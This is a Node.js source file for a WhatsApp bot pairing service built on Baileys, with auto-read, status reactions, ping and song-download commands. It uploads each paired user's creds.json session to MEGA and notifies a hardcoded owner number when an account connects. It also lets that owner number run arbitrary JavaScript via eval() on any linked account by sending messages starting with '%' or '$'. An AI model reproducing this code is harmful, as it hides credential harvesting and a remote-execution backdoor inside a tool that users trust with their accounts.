const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { makeid } = require('./gen-id');
const { upload } = require('./mega');
const DY_SCRAP = require('@dark-yasiya/scrap');
const dy_scrap = new DY_SCRAP();

const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  Browsers,
  makeCacheableSignalKeyStore,
  getContentType,
  jidNormalizedUser
} = require('@whiskeysockets/baileys');

const router = express.Router();

function removeFile(FilePath) {
  if (!fs.existsSync(FilePath)) return false;
  fs.rmSync(FilePath, { recursive: true, force: true });
}

// ✅ INLINE CONFIG HERE (NO config.js needed)
const OWNER_NUMBER = '94773024361'; // your owner number
const AUTO_READ = true;
const AUTO_STATUS_SEEN = true;
const AUTO_STATUS_REACT = true;

function replaceYouTubeID(url) {
  const regex = /(?:youtube\.com\/(?:.*v=|.*\/)|youtu\.be\/|youtube\.com\/embed\/|youtube\.com\/shorts\/)([a-zA-Z0-9_-]{11})/;
  const match = url.match(regex);
  return match ? match[1] : null;
}

router.get('/', async (req, res) => {
  const id = makeid();
  let num = req.query.number;

  async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);

    try {
      const sock = makeWASocket({
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }))
        },
        printQRInTerminal: false,
        browser: Browsers.macOS('Safari'),
        logger: pino({ level: "fatal" })
      });

      sock.ev.on('creds.update', saveCreds);

      sock.ev.on('connection.update', async (s) => {
        const { connection, lastDisconnect } = s;

        if (connection === 'open') {
          console.log(`✅ 𝘾𝙃𝘼𝙈𝘼 𝙈𝘿 BOT Connected as ${sock.user.id}`);

          // ✅ Send connected message to owner
          await sock.sendMessage(`${OWNER_NUMBER}@s.whatsapp.net`, {
            text: `✅ *𝘾𝙃𝘼𝙈𝘼 𝙈𝘿 BOT CONNECTED*\n\n📱 Number: ${sock.user.id.split(':')[0]}\n\n🤖 Status: Online`
          });

          // Upload session to MEGA
          const rf = `./temp/${id}/creds.json`;
          const mega_url = await upload(fs.createReadStream(rf), `${sock.user.id}.json`);
          const session_text = "CHAMA-MD=" + mega_url.replace('https://mega.nz/file/', '');
          await sock.sendMessage(sock.user.id, { text: session_text });

          const desc = `> Do not share this session.\n\n> Powered by 𝘾𝙃𝘼𝙈𝘼 𝙈𝘿`;
          await sock.sendMessage(sock.user.id, { text: desc });

          await removeFile('./temp/' + id);
        } else if (connection === 'close' && lastDisconnect?.error?.output?.statusCode != 401) {
          console.log("Reconnecting...");
          startBot();
        }
      });

      // Generate Pairing Code
      if (!sock.authState.creds.registered) {
        await delay(1500);
        num = num.replace(/[^0-9]/g, '');
        const code = await sock.requestPairingCode(num);
        if (!res.headersSent) res.send({ code });
      }

      // ✅ Messages listener
      sock.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        if (!mek.message) return;

        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
          ? mek.message.ephemeralMessage.message
          : mek.message;

        // ✅ Auto-read
        if (AUTO_READ) {
          await sock.readMessages([mek.key]);
          console.log(`📖 Marked message from ${mek.key.remoteJid} as read.`);
        }

        // ✅ Auto react for status only (no reply)
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
          if (AUTO_STATUS_SEEN) await sock.readMessages([mek.key]);

          if (AUTO_STATUS_REACT) {
            const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await sock.sendMessage(mek.key.remoteJid, {
              react: { text: randomEmoji, key: mek.key }
            });
          }
        }

        // ✅ Command parser
        const from = mek.key.remoteJid;
        const body = mek.message.conversation || mek.message.extendedTextMessage?.text || "";
        const isCmd = body.startsWith('.');
        const command = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const sender = mek.key.fromMe
          ? (sock.user.id.split(':')[0] + '@s.whatsapp.net')
          : (mek.key.participant || mek.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = sock.user.id.split(':')[0];

        // ✅ Simple reply function
        const reply = (text) => sock.sendMessage(from, { text }, { quoted: mek });

        const isOwner = [OWNER_NUMBER, botNumber].includes(senderNumber);

        // 🔥 .ping command
        if (command === 'ping') {
          const start = new Date().getTime();
          await reply("🏓 Pong!");
          const end = new Date().getTime();
          await reply(`⚡ 𝘾𝙃𝘼𝙈𝘼 𝙈𝘿 SPEED: ${(end - start)}ms`);
        }

        // 🔥 .menu command
        if (command === 'menu') {
          const menuText = `╭──❍ *𝘾𝙃𝘼𝙈𝘼 𝙈𝘿 MENU*
│
├ .ping - Check bot speed
├ .play3 <text or yt url> - Download MP3
├ .menu - Show this menu
│
╰───────────────❍`;
          await reply(menuText);
        }

        // 🔥 .play3 command (auto mp3)
        if (command === 'song') {
          if (!q) return await reply("❌ Provide text or YouTube URL!");

          let id = q.startsWith("https://") ? replaceYouTubeID(q) : null;

          if (!id) {
            const searchResults = await dy_scrap.ytsearch(q);
            if (!searchResults?.results?.length) return await reply("❌ No results found!");
            id = searchResults.results[0].videoId;
          }

          const data = await dy_scrap.ytsearch(`https://youtube.com/watch?v=${id}`);
          if (!data?.results?.length) return await reply("❌ Failed to fetch video!");

          const { url, title, image } = data.results[0];

          await sock.sendMessage(from, { image: { url: image }, caption: `🎶 *${title}*\n🖇 ${url}` }, { quoted: mek });

          const msg = await sock.sendMessage(from, { text: "⏳ Downloading MP3..." }, { quoted: mek });

          const response = await dy_scrap.ytmp3(`https://youtube.com/watch?v=${id}`);
          let downloadUrl = response?.result?.download?.url;
          if (!downloadUrl) return await reply("❌ Download link not found!");

          await sock.sendMessage(from, { audio: { url: downloadUrl }, mimetype: "audio/mpeg" }, { quoted: mek });
          await sock.sendMessage(from, { text: '✅ *Audio sent successfully!* ✅', edit: msg.key });
        }

        // 🔥 Owner eval (% code) & exec ($ code)
        if (isOwner && body.startsWith('%')) {
          const code = body.slice(1).trim();
          try {
            let evaled = eval(code);
            if (typeof evaled !== 'string')
              evaled = require('util').inspect(evaled);
            reply(evaled);
          } catch (err) {
            reply(`❌ Error: ${err.message}`);
          }
        }

        if (isOwner && body.startsWith('$')) {
          const code = body.slice(1).trim();
          try {
            let execed = await eval('(async () => {' + code + '})()');
            if (execed) reply(execed.toString());
          } catch (err) {
            reply(`❌ Error: ${err.message}`);
          }
        }
      });

    } catch (err) {
      console.error("Service restarted due to error:", err);
      removeFile('./temp/' + id);
      if (!res.headersSent) res.send({ code: "❗ Service Unavailable" });
    }
  }

  await startBot();
});

module.exports = router;
